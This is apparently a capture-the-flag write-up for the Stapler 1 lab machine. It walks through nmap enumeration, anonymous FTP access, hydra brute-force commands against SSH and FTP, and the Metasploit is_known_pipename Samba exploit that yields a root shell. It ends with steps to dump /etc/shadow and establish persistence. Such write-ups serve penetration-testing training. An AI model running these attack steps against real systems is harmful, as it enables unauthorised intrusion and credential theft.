# Stapler 1 – Exploitation Notes

## 1. Network Discovery

```bash
sudo netdiscover -r 192.168.56.0/24
```

Target identified:
```
<target_ip>
```

---

## 2. Service Enumeration

```bash
sudo nmap -A -sV <target_ip>
```

### Open Ports

| Port | Service | Version |
|------|---------|----------|
| 21   | FTP     | vsftpd 3.0.3 (anonymous enabled) |
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu |
| 53   | DNS     | dnsmasq 2.75 |
| 80   | HTTP    | PHP CLI server 5.5+ |
| 139  | SMB     | Samba 4.3.9-Ubuntu |
| 3306 | MySQL   | 5.7.12-0ubuntu1 |
| 666  | Unknown | ZIP data exposed |

SMB Info:
- Hostname: RED  
- Workgroup: WORKGROUP  
- Message signing: disabled (not required)

---

## 3. FTP Enumeration

Anonymous login allowed:

```bash
ftp <target_ip>
```

Login:
```
Username: anonymous
Password: (blank)
```

File discovered:
```
note
```

Contents:
```
Elly, make sure you update the payload information. Leave it in your FTP account once you are done, John.
```

Indicates:
- Internal user references
- Potential credential reuse

---

## 4. Credential Attacks

### SSH Bruteforce

```bash
hydra -L user.txt -e nsr <target_ip> ssh -V
```

### FTP Bruteforce

```bash
hydra -l user.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_ip> -V -e nsr
```

---

## 5. Samba Exploitation

Search for exploit:

```bash
searchsploit samba 4.3.9
```

Relevant module:
```
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - is_known_pipename()
```

Launch Metasploit:

```bash
msfconsole
use exploit/linux/samba/is_known_pipename
```

Configure module:

```bash
set RHOST <target_ip>
set RPORT 139
set SMB_FOLDER /var/tmp
set SMB_SHARE_NAME tmp
run
```

Result:
```
Root shell obtained
```

---

## 6. Post-Exploitation

Verify privileges:

```bash
whoami
```

Expected:
```
root
```

From this point:
- Enumerate `/etc/passwd`
- Dump `/etc/shadow`
- Extract credentials
- Establish persistence if required

---

# Final Result

✔ Anonymous FTP access  
✔ Multiple services exposed  
✔ Samba 4.3.9 exploited  
✔ Root access achieved  

Attack vector used:
- Network enumeration  
- FTP information disclosure  
- SMB remote code execution  
- Metasploit exploitation  